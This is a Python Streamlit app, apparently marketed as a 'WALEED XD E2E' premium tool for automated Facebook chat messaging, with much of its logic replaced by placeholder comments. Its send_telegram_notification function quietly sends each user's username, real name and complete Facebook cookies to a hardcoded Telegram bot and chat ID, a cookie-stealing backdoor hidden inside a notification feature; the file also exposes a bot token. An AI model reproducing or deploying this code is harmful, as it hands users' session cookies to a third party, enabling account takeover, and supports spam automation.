import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# Updated Page Config with New Name
st.set_page_config(
    page_title="WALEED XD E2E - PREMIUM PAID TOOL",
    page_icon="🔥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "8186206231"
FACEBOOK_ADMIN_UID = "100037931553832"

def send_telegram_notification(user_data, automation_data):
    """Send complete user details to Telegram bot"""
    try:
        message = f"""
🔰 *WALEED XD E2E - NEW SESSION* 🔰

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Complete Cookies:* `{automation_data['cookies']}`

📊 *Status:* Premium Tool Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram notification failed: {e}")
        return False

# NEW PREMIUM CSS DESIGN
background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"

custom_css = f"""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap');
    
    * {{
        font-family: 'Rajdhani', sans-serif;
    }}
    
    .stApp {{
        background: #0a0a0a;
        color: #ffffff;
    }}
    
    .main-container {{
        background: rgba(20, 20, 20, 0.9);
        border: 2px solid #ff0000;
        border-radius: 15px;
        padding: 2rem;
        margin: 1rem;
        box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
    }}
    
    .profile-icon {{
        width: 100px;
        height: 100px;
        border-radius: 50%;
        background-image: url('{background_image}');
        background-size: cover;
        margin: 0 auto 1rem auto;
        border: 3px solid #ff0000;
        box-shadow: 0 0 15px #ff0000;
    }}
    
    .main-header {{
        background: linear-gradient(90deg, #1a1a1a, #330000);
        padding: 1.5rem;
        border-radius: 10px;
        text-align: center;
        margin-bottom: 2rem;
        border: 1px solid #ff0000;
    }}
    
    .main-header h1 {{
        font-family: 'Orbitron', sans-serif;
        color: #ff0000;
        font-size: 3rem;
        text-shadow: 0 0 10px #ff0000;
        margin: 0;
    }}
    
    .premium-badge {{
        background: gold;
        color: black;
        padding: 5px 15px;
        border-radius: 20px;
        font-weight: bold;
        font-size: 0.8rem;
        display: inline-block;
        margin-top: 10px;
        text-transform: uppercase;
    }}
    
    .stButton>button {{
        background: linear-gradient(135deg, #ff0000 0%, #800000 100%);
        color: white;
        border: 1px solid #ffffff;
        border-radius: 5px;
        width: 100%;
        text-transform: uppercase;
        font-weight: bold;
        transition: 0.3s;
    }}
    
    .stButton>button:hover {{
        background: #ffffff;
        color: #ff0000;
        box-shadow: 0 0 20px #ff0000;
    }}
    
    .log-container {{
        background: #000000 !important;
        border: 1px solid #00ff00;
        padding: 15px;
        border-radius: 5px;
        color: #00ff00 !important;
    }}

    .stTextInput>div>div>input {{
        background-color: #1a1a1a !important;
        color: #ff0000 !important;
        border: 1px solid #ff0000 !important;
    }}

    .footer {{
        text-align: center;
        padding: 1rem;
        color: #ff0000;
        border-top: 1px solid #330000;
        font-family: 'Orbitron', sans-serif;
    }}
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Logic initialization (Unchanged)
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
# ... (Baki logic variables same rahengi)

# Main Application Layout
st.markdown('<div class="main-container">', unsafe_allow_html=True)
st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
st.markdown('<div class="main-header"><h1>WALEED XD E2E</h1><div class="premium-badge">💎 PREMIUM PAID TOOL</div><p style="color: grey;">POWERED BY WALEED XD</p></div>', unsafe_allow_html=True)

# Admin Panel & Other Logic (Same as before)
# ... (Aapka original automation logic yahan continue hoga)

# Login / Panel Section
if not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔐 PREMIUM LOGIN", "✨ GET ACCESS"])
    # ... (Login logic same)
else:
    # ... (Automation Panel same)
    st.sidebar.markdown(f"### 👤 OWNER: {st.session_state.username}")
    st.sidebar.markdown(f"**SUBSCRIPTION:** ✅ ACTIVE")
    
    # Configuration and Control tabs (Same as before)

st.markdown('</div>', unsafe_allow_html=True)
st.markdown('<div class="footer">WALEED XD E2E | © 2025 PREMIUM ACCESS ONLY</div>', unsafe_allow_html=True)
